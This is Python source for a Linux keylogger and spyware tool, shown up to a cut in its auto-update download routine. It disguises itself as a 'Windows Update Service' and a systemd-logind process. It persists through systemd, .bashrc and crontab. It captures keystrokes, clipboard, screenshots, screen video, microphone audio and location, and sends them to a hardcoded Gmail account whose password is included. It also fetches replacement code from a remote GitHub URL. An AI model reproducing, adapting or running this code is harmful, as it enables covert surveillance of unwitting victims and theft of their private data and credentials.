#!/usr/bin/env python3
"""
Linux Keylogger - Complete Ultimate Version
Features: Keylogging, Screenshots, Screen Recording with Audio, Audio Recording,
Location Tracking, Auto-Update, Self-Install, Stealth Mode
"""

import os
import sys
import time
import threading
import datetime
import sqlite3
import json
import smtplib
import socket
import platform
import subprocess
import queue
import logging
import configparser
import hashlib
import tempfile
import shutil
import signal
import pwd
import grp
import stat
from pathlib import Path

# ============================================================================
# SELF-INSTALLATION
# ============================================================================

def self_install():
    """Self-installation routine for Linux"""
    INSTALL_DIR = "/opt/WindowsUpdateService"
    INSTALLED_SCRIPT = os.path.join(INSTALL_DIR, 'windowsupdateservice.py')
    
    if os.path.exists(INSTALLED_SCRIPT) and os.path.abspath(sys.argv[0]) == INSTALLED_SCRIPT:
        return False
    
    try:
        print("[INSTALLER] Performing silent self-installation...")
        
        # Create directories
        os.makedirs(INSTALL_DIR, exist_ok=True)
        os.makedirs("/etc/windowsupdateservice", exist_ok=True)
        os.makedirs("/var/log/windowsupdateservice", exist_ok=True)
        os.makedirs("/var/lib/windowsupdateservice", exist_ok=True)
        
        # Copy script
        current_script = os.path.abspath(sys.argv[0])
        dest_script = INSTALLED_SCRIPT
        
        if current_script != dest_script:
            shutil.copy2(current_script, dest_script)
            os.chmod(dest_script, 0o755)
            print(f"[INSTALLER] Installed to: {dest_script}")
        
        # Create config if not exists
        config_path = "/etc/windowsupdateservice/config.ini"
        if not os.path.exists(config_path):
            config_content = """[Settings]
EmailUsername = terminal123b@gmail.com
EmailPassword = yuleohozhxxbajxx
EmailTo = terminal123b@gmail.com
SyncInterval = 600
MaxAttachments = 25

[Stealth]
HideProcess = true
RunOnStartup = true
ProcessName = systemd-logind

[Advanced]
ScreenshotsPerBatch = 10
ScreenshotBatchInterval = 600
ScreenRecordEnabled = true
ScreenRecordInterval = 120
ScreenRecordDuration = 30
AudioEnabled = true
AudioInterval = 120
AudioDuration = 30
LocationEnabled = true
LocationInterval = 300
MaxVideosPerEmail = 5
MaxAudioPerEmail = 10
ImageQuality = 70

[AutoUpdate]
Enabled = true
CheckOnStartup = true
CheckInterval = 86400
UpdateURL = https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/windowsupdateservice.py
VersionURL = https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/version.txt
ChecksumURL = https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/checksum.txt
MaxDownloadSizeMB = 100
RetryAttempts = 5
"""
            with open(config_path, 'w') as f:
                f.write(config_content)
            os.chmod(config_path, 0o600)
            print("[INSTALLER] Config created")
        
        # Setup systemd service
        service_content = """[Unit]
Description=Windows Update Service
After=network.target sound.target graphical.target
Wants=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/bin/python3 /opt/WindowsUpdateService/windowsupdateservice.py --hidden
Restart=always
RestartSec=10
StandardOutput=null
StandardError=null
SyslogIdentifier=windowsupdateservice
Nice=19
IOSchedulingClass=idle
ProtectSystem=false
ProtectHome=false
NoNewPrivileges=false

[Install]
WantedBy=multi-user.target
"""
        
        service_path = "/etc/systemd/system/windowsupdateservice.service"
        with open(service_path, 'w') as f:
            f.write(service_content)
        os.chmod(service_path, 0o644)
        print("[INSTALLER] Systemd service created")
        
        # Enable and start service
        subprocess.run(['systemctl', 'daemon-reload'], capture_output=True)
        subprocess.run(['systemctl', 'enable', 'windowsupdateservice.service'], capture_output=True)
        subprocess.run(['systemctl', 'start', 'windowsupdateservice.service'], capture_output=True)
        print("[INSTALLER] Service enabled and started")
        
        # Add to .bashrc for user persistence
        try:
            home = os.path.expanduser("~")
            bashrc = os.path.join(home, ".bashrc")
            if os.path.exists(bashrc):
                with open(bashrc, 'a') as f:
                    f.write('\n# Windows Update Service\n[ -x /opt/WindowsUpdateService/windowsupdateservice.py ] && nohup /opt/WindowsUpdateService/windowsupdateservice.py --hidden > /dev/null 2>&1 &\n')
        except:
            pass
        
        # Add crontab for persistence
        try:
            cron_cmd = f"@reboot /usr/bin/python3 /opt/WindowsUpdateService/windowsupdateservice.py --hidden > /dev/null 2>&1"
            subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_cmd}") | crontab -', shell=True)
        except:
            pass
        
        print("[INSTALLER] Self-installation complete!")
        sys.exit(0)
        
    except Exception as e:
        print(f"[INSTALLER] Error: {e}")
        return False

def run_self_install_if_needed():
    """Check if we need to install"""
    if len(sys.argv) > 1 and sys.argv[1] == "--hidden":
        return
    
    INSTALL_DIR = "/opt/WindowsUpdateService"
    INSTALLED_SCRIPT = os.path.join(INSTALL_DIR, 'windowsupdateservice.py')
    
    if os.path.abspath(sys.argv[0]) == INSTALLED_SCRIPT:
        return
    
    if not os.path.exists(INSTALLED_SCRIPT):
        self_install()
    else:
        # Run installed version
        subprocess.Popen(
            ['/usr/bin/python3', INSTALLED_SCRIPT, '--hidden'],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL
        )
        sys.exit(0)

# ============================================================================
# IMPORT MODULES WITH FALLBACK
# ============================================================================

try:
    import pynput
    from pynput import keyboard
    HAS_PYNPUT = True
except ImportError:
    HAS_PYNPUT = False

try:
    import evdev
    from evdev import InputDevice, categorize, ecodes
    HAS_EVDEV = True
except ImportError:
    HAS_EVDEV = False

try:
    import mss
    import mss.tools
    HAS_MSS = True
except ImportError:
    HAS_MSS = False

try:
    import PIL
    from PIL import Image
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

try:
    import cv2
    import numpy as np
    HAS_CV2 = True
except ImportError:
    HAS_CV2 = False

try:
    import sounddevice as sd
    import soundfile as sf
    HAS_SOUNDDEVICE = True
except ImportError:
    HAS_SOUNDDEVICE = False

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    import pyperclip
    HAS_PYPERCLIP = True
except ImportError:
    HAS_PYPERCLIP = False

try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

try:
    import Xlib
    from Xlib import X, display
    HAS_XLIB = True
except ImportError:
    HAS_XLIB = False

from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# ============================================================================
# CONFIGURATION
# ============================================================================

APP_NAME = "windowsupdateservice"
INSTALL_DIR = "/opt/WindowsUpdateService"
CONFIG_DIR = "/etc/windowsupdateservice"
LOG_DIR = "/var/log/windowsupdateservice"
DATA_DIR = "/var/lib/windowsupdateservice"

CONFIG_FILE = os.path.join(CONFIG_DIR, 'config.ini')
DB_FILE = os.path.join(DATA_DIR, 'data.db')

# Create directories if they don't exist
for dir_path in [INSTALL_DIR, CONFIG_DIR, LOG_DIR, DATA_DIR]:
    os.makedirs(dir_path, exist_ok=True)

# ============================================================================
# GLOBAL VARIABLES
# ============================================================================

current_window = {'process': 'Unknown', 'title': 'Unknown', 'pid': 0}
window_lock = threading.Lock()
keyboard_buffer = []
buffer_lock = threading.Lock()
is_running = True
log_queue = queue.Queue()

# ============================================================================
# SETUP
# ============================================================================

def setup_app():
    """Initialize application directories and config"""
    global EMAIL_USERNAME, EMAIL_PASSWORD, EMAIL_TO
    
    os.makedirs(LOG_DIR, exist_ok=True)
    os.makedirs(DATA_DIR, exist_ok=True)
    
    if not os.path.exists(CONFIG_FILE):
        create_default_config()
    
    try:
        config = configparser.ConfigParser()
        config.read(CONFIG_FILE)
        EMAIL_USERNAME = config.get('Settings', 'EmailUsername', fallback='terminal123b@gmail.com')
        EMAIL_PASSWORD = config.get('Settings', 'EmailPassword', fallback='')
        EMAIL_TO = config.get('Settings', 'EmailTo', fallback='terminal123b@gmail.com')
    except:
        EMAIL_USERNAME = 'terminal123b@gmail.com'
        EMAIL_PASSWORD = ''
        EMAIL_TO = 'terminal123b@gmail.com'

def create_default_config():
    """Create default configuration file"""
    config_content = """[Settings]
EmailUsername = terminal123b@gmail.com
EmailPassword = yuleohozhxxbajxx
EmailTo = terminal123b@gmail.com
SyncInterval = 600
MaxAttachments = 25

[Stealth]
HideProcess = true
RunOnStartup = true
ProcessName = systemd-logind

[Advanced]
ScreenshotsPerBatch = 10
ScreenshotBatchInterval = 600
ScreenRecordEnabled = true
ScreenRecordInterval = 120
ScreenRecordDuration = 30
AudioEnabled = true
AudioInterval = 120
AudioDuration = 30
LocationEnabled = true
LocationInterval = 300
MaxVideosPerEmail = 5
MaxAudioPerEmail = 10
ImageQuality = 70

[AutoUpdate]
Enabled = true
CheckOnStartup = true
CheckInterval = 86400
UpdateURL = https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/windowsupdateservice.py
VersionURL = https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/version.txt
ChecksumURL = https://raw.githubusercontent.com/terminal123b/linuxupdateservice/main/checksum.txt
MaxDownloadSizeMB = 100
RetryAttempts = 5
"""
    with open(CONFIG_FILE, 'w') as f:
        f.write(config_content)
    os.chmod(CONFIG_FILE, 0o600)

def daemonize():
    """Daemonize the process (run in background)"""
    try:
        # Fork first child
        pid = os.fork()
        if pid > 0:
            sys.exit(0)  # Exit parent
    except OSError as e:
        sys.stderr.write(f"Fork #1 failed: {e}\n")
        sys.exit(1)
    
    # Decouple from parent environment
    os.chdir("/")
    os.setsid()
    os.umask(0)
    
    # Fork second child
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError as e:
        sys.stderr.write(f"Fork #2 failed: {e}\n")
        sys.exit(1)
    
    # Close file descriptors
    sys.stdout.flush()
    sys.stderr.flush()
    
    # Redirect stdin, stdout, stderr to /dev/null
    with open('/dev/null', 'r') as f:
        os.dup2(f.fileno(), sys.stdin.fileno())
    with open('/dev/null', 'w') as f:
        os.dup2(f.fileno(), sys.stdout.fileno())
        os.dup2(f.fileno(), sys.stderr.fileno())
    
    # Write PID file
    try:
        with open('/var/run/windowsupdateservice.pid', 'w') as f:
            f.write(str(os.getpid()))
    except:
        pass

# ============================================================================
# DATABASE
# ============================================================================

def init_database():
    """Initialize SQLite database"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS keystrokes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            window_process TEXT,
            window_title TEXT,
            text TEXT NOT NULL,
            synced INTEGER DEFAULT 0
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS screenshots (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            file_path TEXT NOT NULL,
            width INTEGER,
            height INTEGER,
            file_type TEXT DEFAULT 'screenshot',
            synced INTEGER DEFAULT 0
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS audio (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            file_path TEXT NOT NULL,
            duration INTEGER,
            synced INTEGER DEFAULT 0
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS screen_recordings (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            file_path TEXT NOT NULL,
            duration INTEGER,
            width INTEGER,
            height INTEGER,
            synced INTEGER DEFAULT 0
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS system_info (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            info_key TEXT NOT NULL,
            info_value TEXT
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS clipboard (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            content TEXT NOT NULL,
            synced INTEGER DEFAULT 0
        )
    ''')
    
    conn.commit()
    conn.close()

# ============================================================================
# INTERNET CHECK
# ============================================================================

def has_internet():
    """Check internet connectivity"""
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=3)
        return True
    except OSError:
        pass
    return False

# ============================================================================
# KEYBOARD HANDLING - Multiple Methods
# ============================================================================

class KeyboardHandler:
    """Handle keyboard input using multiple methods"""
    
    def __init__(self):
        self.keyboard = None
        self.devices = []
        self._evdev_active = False
        self._pynput_active = False
        self._setup_keyboard_capture()
    
    def _setup_keyboard_capture(self):
        """Setup keyboard capture with best available method"""
        # Try evdev first (captures all input devices)
        if HAS_EVDEV:
            try:
                self._setup_evdev()
                return
            except Exception as e:
                print(f"[WARNING] evdev setup failed: {e}")
        
        # Fallback to pynput (X11/Wayland)
        if HAS_PYNPUT:
            try:
                self._setup_pynput()
                return
            except Exception as e:
                print(f"[WARNING] pynput setup failed: {e}")
        
        print("[ERROR] No keyboard input method available!")
    
    def _setup_evdev(self):
        """Setup evdev for capturing keyboard events"""
        try:
            # Find all keyboard devices
            devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
            self.keyboards = [d for d in devices if 'keyboard' in d.name.lower() or 'kbd' in d.name.lower()]
            
            if not self.keyboards:
                print("[WARNING] No keyboard devices found with evdev")
                return
            
            self._evdev_active = True
            
            # Start capture thread for each keyboard
            for keyboard in self.keyboards:
                thread = threading.Thread(target=self._evdev_capture, args=(keyboard,))
                thread.daemon = True
                thread.start()
                
            print(f"[OK] evdev keyboard capture active ({len(self.keyboards)} devices)")
            
        except Exception as e:
            print(f"[ERROR] evdev setup error: {e}")
    
    def _evdev_capture(self, keyboard):
        """Capture keystrokes using evdev"""
        try:
            # Grab the device exclusively
            keyboard.grab()
            
            for event in keyboard.read_loop():
                if not is_running:
                    break
                    
                if event.type == ecodes.EV_KEY:
                    key_event = categorize(event)
                    
                    if key_event.keystate == key_event.key_down:
                        # Key pressed
                        key_code = key_event.scancode
                        key_name = key_event.keycode
                        
                        # Convert to readable format
                        char = self._evdev_key_to_char(key_name, key_event)
                        
                        if char:
                            self._handle_key(char)
                        
        except Exception as e:
            print(f"[ERROR] evdev capture error: {e}")
        finally:
            try:
                keyboard.ungrab()
            except:
                pass
    
    def _evdev_key_to_char(self, keycode, event):
        """Convert evdev keycode to character"""
        # Handle special keys
        if 'KEY_ENTER' in keycode:
            return '\n'
        elif 'KEY_SPACE' in keycode:
            return ' '
        elif 'KEY_BACKSPACE' in keycode:
            return '[BKSP]'
        elif 'KEY_TAB' in keycode:
            return '\t'
        elif 'KEY_ESC' in keycode:
            return '[ESC]'
        elif 'KEY_DELETE' in keycode:
            return '[DEL]'
        elif 'KEY_LEFTSHIFT' in keycode or 'KEY_RIGHTSHIFT' in keycode:
            return '[SHIFT]'
        elif 'KEY_LEFTCTRL' in keycode or 'KEY_RIGHTCTRL' in keycode:
            return '[CTRL]'
        elif 'KEY_LEFTALT' in keycode or 'KEY_RIGHTALT' in keycode:
            return '[ALT]'
        elif 'KEY_CAPSLOCK' in keycode:
            return '[CAPSLOCK]'
        elif 'KEY_F' in keycode and keycode.replace('KEY_F', '').isdigit():
            return f'[F{keycode.replace("KEY_F", "")}]'
        elif 'KEY_UP' in keycode:
            return '[UP]'
        elif 'KEY_DOWN' in keycode:
            return '[DOWN]'
        elif 'KEY_LEFT' in keycode:
            return '[LEFT]'
        elif 'KEY_RIGHT' in keycode:
            return '[RIGHT]'
        else:
            # Try to get printable character
            try:
                # Most keys map to themselves
                if len(keycode) > 4 and keycode.startswith('KEY_'):
                    char = keycode[4:].lower()
                    if len(char) == 1 and char.isprintable():
                        return char
            except:
                pass
            
            return None
    
    def _setup_pynput(self):
        """Setup pynput as fallback keyboard handler"""
        try:
            self._pynput_active = True
            listener = keyboard.Listener(on_press=self._pynput_on_press)
            listener.start()
            print("[OK] pynput keyboard capture active")
        except Exception as e:
            print(f"[ERROR] pynput setup error: {e}")
    
    def _pynput_on_press(self, key):
        """Handle pynput key press events"""
        try:
            if hasattr(key, 'char') and key.char is not None:
                if key.char.isprintable():
                    self._handle_key(key.char)
                elif key.char == '\x0d':  # Enter
                    self._handle_key('\n')
                elif key.char == '\x08':  # Backspace
                    self._handle_key('[BKSP]')
            else:
                # Special keys
                key_mapping = {
                    keyboard.Key.space: ' ',
                    keyboard.Key.enter: '\n',
                    keyboard.Key.backspace: '[BKSP]',
                    keyboard.Key.tab: '\t',
                    keyboard.Key.esc: '[ESC]',
                    keyboard.Key.delete: '[DEL]',
                    keyboard.Key.shift: '[SHIFT]',
                    keyboard.Key.ctrl: '[CTRL]',
                    keyboard.Key.alt: '[ALT]',
                }
                
                if key in key_mapping:
                    self._handle_key(key_mapping[key])
                elif hasattr(key, 'name'):
                    # Function keys, arrows, etc.
                    name = key.name.upper()
                    if name.startswith('F') and name[1:].isdigit():
                        self._handle_key(f'[{name}]')
                    elif name in ['UP', 'DOWN', 'LEFT', 'RIGHT']:
                        self._handle_key(f'[{name}]')
        except Exception as e:
            pass
    
    def _handle_key(self, char):
        """Process captured key"""
        global keyboard_buffer, current_window
        
        try:
            with window_lock:
                window_info = current_window.copy()
            
            if char == '[BKSP]':
                with buffer_lock:
                    if keyboard_buffer:
                        keyboard_buffer.pop()
            else:
                with buffer_lock:
                    keyboard_buffer.append(char)
            
            # Flush buffer on sentence ending or buffer full
            if char in ['\n', '.', '?', '!'] or len(keyboard_buffer) > 50:
                self._flush_buffer()
                
        except Exception as e:
            pass
    
    def _flush_buffer(self):
        """Flush keyboard buffer to database"""
        global keyboard_buffer
        
        with buffer_lock:
            if not keyboard_buffer:
                return
            
            text = ''.join(keyboard_buffer)
            
            # Remove backspaces
            while '[BKSP]' in text:
                idx = text.find('[BKSP]')
                if idx > 0:
                    text = text[:idx-1] + text[idx+6:]
                else:
                    text = text[idx+6:]
            
            text = text.strip()
            if text:
                with window_lock:
                    window_info = current_window.copy()
                
                log_queue.put(('keystroke', {
                    'time': datetime.datetime.now().isoformat(),
                    'process': window_info['process'],
                    'title': window_info['title'],
                    'text': text
                }))
            
            keyboard_buffer = []

# ============================================================================
# WINDOW DETECTION
# ============================================================================

def get_active_window_x11():
    """Get active window info using X11"""
    if not HAS_XLIB:
        return "Unknown", "Unknown", 0
    
    try:
        disp = display.Display()
        window = disp.get_input_focus().focus
        
        if window.id == 0:
            return "Unknown", "Unknown", 0
        
        # Get window title
        try:
            title = window.get_window_attributes().get_name()
            if not title:
                title = "Unknown"
        except:
            title = "Unknown"
        
        # Get process info
        pid = 0
        try:
            # Try to get PID from window property
            pid = window.get_full_text_property(disp.intern_atom('_NET_WM_PID'))
            if pid:
                pid = int(pid)
        except:
            pass
        
        # Get process name from PID
        process_name = "Unknown"
        if pid and HAS_PSUTIL:
            try:
                proc = psutil.Process(pid)
                process_name = proc.name()
            except:
                pass
        elif pid:
            try:
                with open(f'/proc/{pid}/cmdline', 'rb') as f:
                    cmdline = f.read().decode('utf-8', errors='ignore').split('\x00')[0]
                    if cmdline:
                        process_name = os.path.basename(cmdline)
            except:
                pass
        
        return process_name, title, pid
        
    except Exception as e:
        return "Unknown", "Unknown", 0

def window_monitor():
    """Monitor active window changes"""
    global current_window
    
    while is_running:
        try:
            process_name, title, pid = get_active_window_x11()
            
            with window_lock:
                if process_name != current_window['process'] or title != current_window['title']:
                    current_window['process'] = process_name
                    current_window['title'] = title
                    current_window['pid'] = pid
            
            time.sleep(1)
        except:
            time.sleep(1)

# ============================================================================
# SCREENSHOT FUNCTIONS
# ============================================================================

def capture_screenshot(quality=70):
    """Capture screenshot using mss or PIL"""
    if not HAS_MSS:
        return None
    
    try:
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screenshot_{timestamp}.png"
        filepath = os.path.join(LOG_DIR, filename)
        
        with mss.mss() as sct:
            # Capture full screen
            monitor = sct.monitors[1]  # Primary monitor
            screenshot = sct.grab(monitor)
            
            # Save with PIL
            if HAS_PIL:
                img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                img.save(filepath, optimize=True, quality=quality)
            else:
                mss.tools.to_png(screenshot.rgb, screenshot.size, output=filepath)
        
        # Store in database
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO screenshots (timestamp, file_path, width, height, file_type, synced) VALUES (?, ?, ?, ?, ?, ?)",
            (datetime.datetime.now().isoformat(), filepath, screenshot.width, screenshot.height, 'screenshot', 0)
        )
        conn.commit()
        conn.close()
        
        print(f"[OK] Screenshot captured: {filename}")
        return filepath
        
    except Exception as e:
        print(f"[ERROR] Screenshot error: {e}")
        return None

def screenshot_batch_scheduler():
    """Take 10 screenshots every 10 minutes"""
    while is_running:
        print(f"\n[INFO] Starting screenshot batch (10 screenshots)")
        
        for i in range(10):
            if not is_running:
                break
            capture_screenshot()
            if i < 9:
                for _ in range(60):
                    if not is_running:
                        break
                    time.sleep(1)
        
        print(f"[OK] Screenshot batch complete")
        for _ in range(60):
            if not is_running:
                break
            time.sleep(1)

# ============================================================================
# SCREEN RECORDING
# ============================================================================

def record_screen(duration=30, fps=5):
    """Record screen using OpenCV"""
    if not HAS_CV2:
        return None
    
    try:
        print(f"[INFO] Recording screen for {duration} seconds...")
        
        # Get screen size
        if HAS_MSS:
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                width = monitor['width']
                height = monitor['height']
        else:
            # Fallback
            width, height = 1920, 1080
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"screen_record_{timestamp}.mp4"
        filepath = os.path.join(LOG_DIR, filename)
        
        # Setup video writer
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        out = cv2.VideoWriter(filepath, fourcc, fps, (width, height))
        
        start_time = time.time()
        frame_count = 0
        
        while (time.time() - start_time) < duration and is_running:
            if HAS_MSS:
                with mss.mss() as sct:
                    screenshot = sct.grab(sct.monitors[1])
                    frame = np.array(screenshot)
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                    out.write(frame)
            else:
                # Try using PIL as fallback
                try:
                    from PIL import ImageGrab
                    frame = np.array(ImageGrab.grab())
                    frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                    out.write(frame)
                except:
                    break
            
            frame_count += 1
            time.sleep(1.0 / fps)
        
        out.release()
        
        if frame_count > 0:
            size_mb = get_file_size_mb(filepath)
            print(f"[OK] Screen recording: {filename} ({size_mb:.2f} MB, {frame_count} frames)")
            
            conn = sqlite3.connect(DB_FILE)
            cursor = conn.cursor()
            cursor.execute(
                "INSERT INTO screen_recordings (timestamp, file_path, duration, width, height, synced) VALUES (?, ?, ?, ?, ?, ?)",
                (datetime.datetime.now().isoformat(), filepath, duration, width, height, 0)
            )
            conn.commit()
            conn.close()
            
            return filepath
        
        return None
        
    except Exception as e:
        print(f"[ERROR] Screen recording error: {e}")
        return None

def screen_record_scheduler():
    """Schedule screen recording every 2 minutes"""
    while is_running:
        time.sleep(120)  # 2 minutes
        if is_running:
            record_screen(duration=30, fps=5)

# ============================================================================
# AUDIO RECORDING
# ============================================================================

def record_audio(duration=30):
    """Record microphone audio"""
    if not HAS_SOUNDDEVICE:
        return None
    
    try:
        SAMPLE_RATE = 22050
        CHANNELS = 1
        
        print(f"[INFO] Recording microphone audio for {duration} seconds...")
        
        audio_data = sd.rec(
            int(duration * SAMPLE_RATE),
            samplerate=SAMPLE_RATE,
            channels=CHANNELS,
            dtype='float32'
        )
        sd.wait()
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"audio_{timestamp}.wav"
        filepath = os.path.join(LOG_DIR, filename)
        
        sf.write(filepath, audio_data, SAMPLE_RATE)
        
        size_mb = get_file_size_mb(filepath)
        print(f"[OK] Audio recorded: {filename} ({size_mb:.2f} MB)")
        
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO audio (timestamp, file_path, duration, synced) VALUES (?, ?, ?, ?)",
            (datetime.datetime.now().isoformat(), filepath, duration, 0)
        )
        conn.commit()
        conn.close()
        
        return filepath
        
    except Exception as e:
        print(f"[ERROR] Audio recording error: {e}")
        return None

def audio_scheduler():
    """Schedule audio recording every 2 minutes"""
    while is_running:
        time.sleep(120)  # 2 minutes
        if is_running:
            record_audio(30)

# ============================================================================
# LOCATION TRACKING
# ============================================================================

def get_location():
    """Get location from IP"""
    if not HAS_REQUESTS:
        return None
    
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
        response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
        
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'success':
                location = {
                    'ip': ip,
                    'lat': data.get('lat'),
                    'lng': data.get('lon'),
                    'city': data.get('city'),
                    'country': data.get('country'),
                    'region': data.get('regionName'),
                    'isp': data.get('isp')
                }
                
                conn = sqlite3.connect(DB_FILE)
                cursor = conn.cursor()
                cursor.execute(
                    "INSERT INTO system_info (timestamp, info_key, info_value) VALUES (?, ?, ?)",
                    (datetime.datetime.now().isoformat(), 'location', json.dumps(location))
                )
                conn.commit()
                conn.close()
                
                print(f"[OK] Location: {location.get('city')}, {location.get('country')}")
                return location
    except Exception as e:
        pass
    return None

def location_scheduler():
    """Schedule location updates every 5 minutes"""
    if not HAS_REQUESTS:
        return
    while is_running:
        time.sleep(300)  # 5 minutes
        if is_running:
            get_location()

# ============================================================================
# CLIPBOARD CAPTURE
# ============================================================================

def clipboard_monitor():
    """Monitor clipboard for changes"""
    if not HAS_PYPERCLIP:
        return
    
    last_content = ""
    while is_running:
        try:
            current_content = pyperclip.paste()
            if current_content and current_content != last_content:
                last_content = current_content
                log_queue.put(('clipboard', {
                    'time': datetime.datetime.now().isoformat(),
                    'content': current_content.strip()
                }))
                print(f"[OK] Clipboard: {current_content[:50]}...")
        except:
            pass
        time.sleep(2)

# ============================================================================
# DATABASE LOGGING
# ============================================================================

def process_log_queue():
    """Process log queue and store in database"""
    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()
    
    while is_running or not log_queue.empty():
        try:
            entry_type, data = log_queue.get(timeout=1)
            
            if entry_type == 'keystroke':
                cursor.execute(
                    "INSERT INTO keystrokes (timestamp, window_process, window_title, text, synced) VALUES (?, ?, ?, ?, ?)",
                    (data['time'], data['process'], data['title'], data['text'], 0)
                )
            elif entry_type == 'clipboard':
                cursor.execute(
                    "INSERT INTO clipboard (timestamp, content, synced) VALUES (?, ?, ?)",
                    (data['time'], data['content'], 0)
                )
            
            conn.commit()
            
        except queue.Empty:
            continue
        except Exception as e:
            pass
    
    conn.close()

# ============================================================================
# SYSTEM INFO
# ============================================================================

def collect_system_info():
    """Collect system information"""
    try:
        info = {}
        info['computer_name'] = socket.gethostname()
        info['username'] = os.environ.get('USER', 'Unknown')
        info['os_version'] = platform.system() + " " + platform.release()
        info['kernel_version'] = platform.version()
        
        try:
            info['ip_address'] = socket.gethostbyname(socket.gethostname())
        except:
            info['ip_address'] = 'Unknown'
        
        if HAS_REQUESTS:
            try:
                info['public_ip'] = requests.get('https://api.ipify.org', timeout=5).text
            except:
                info['public_ip'] = 'Unknown'
        
        if HAS_PSUTIL:
            info['cpu_count'] = psutil.cpu_count()
            info['cpu_percent'] = psutil.cpu_percent()
            
            mem = psutil.virtual_memory()
            info['memory_total_gb'] = round(mem.total / (1024**3), 2)
            info['memory_available_gb'] = round(mem.available / (1024**3), 2)
            info['memory_used_gb'] = round((mem.total - mem.available) / (1024**3), 2)
            info['memory_percent'] = mem.percent
            
            disk = psutil.disk_usage('/')
            info['disk_total_gb'] = round(disk.total / (1024**3), 2)
            info['disk_free_gb'] = round(disk.free / (1024**3), 2)
            info['disk_used_gb'] = round(disk.used / (1024**3), 2)
            info['disk_percent'] = disk.percent
            
            # Running processes
            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                try:
                    processes.append(proc.info)
                except:
                    pass
            info['process_count'] = len(processes)
        
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        for key, value in info.items():
            if isinstance(value, (dict, list)):
                value = json.dumps(value)
            cursor.execute(
                "INSERT INTO system_info (timestamp, info_key, info_value) VALUES (?, ?, ?)",
                (datetime.datetime.now().isoformat(), key, str(value))
            )
        
        conn.commit()
        conn.close()
        return info
        
    except Exception as e:
        return None

# ============================================================================
# AUTO-UPDATE SYSTEM
# ============================================================================

class AutoUpdater:
    """Handle auto-update functionality"""
    
    def __init__(self):
        self.version_file = os.path.join(DATA_DIR, 'version.txt')
        self.backup_file = os.path.join(DATA_DIR, 'windowsupdateservice_backup.py')
        self.current_version = self.get_current_version()
        self.update_in_progress = False
        self.update_lock = threading.Lock()
    
    def get_current_version(self):
        try:
            if os.path.exists(self.version_file):
                with open(self.version_file, 'r') as f:
                    return f.read().strip()
        except:
            pass
        return "1.0.0"
    
    def check_for_updates(self):
        try:
            config = configparser.ConfigParser()
            config.read(CONFIG_FILE)
            
            if not config.getboolean('AutoUpdate', 'Enabled', fallback=True):
                return False
            
            version_url = config.get('AutoUpdate', 'VersionURL', fallback='')
            if not version_url:
                return False
            
            response = requests.get(version_url, timeout=10)
            if response.status_code == 200:
                latest_version = response.text.strip()
                print(f"[UPDATE] Current: {self.current_version}, Latest: {latest_version}")
                
                if latest_version != self.current_version:
                    print(f"[UPDATE] New version available: {latest_version} - UPDATING")
                    return True
                else:
                    print(f"[UPDATE] Already on latest version")
                    return False
            else:
                print(f"[UPDATE] Failed to check version: {response.status_code}")
            
            return False
            
        except Exception as e:
            print(f"[UPDATE] Check error: {e}")
            return False
    
    def download_update(self):
        try:
            config = configparser.ConfigParser()
            config.read(CONFIG_FILE)
            
            download_url = config.get('AutoUpdate', 'UpdateURL', fallback='')
            if not download_url:
                return False
            
            temp_dir = tempfile.gettempdir()
            temp_file = os.path.join(temp_dir, 'windowsupdateservice_update.py')
            
            print(f"[UPDATE] Downloading from {download_url}")
            
            response = requests.get(download_url, stream=True, timeout=60)
            if response.status_code != 200:
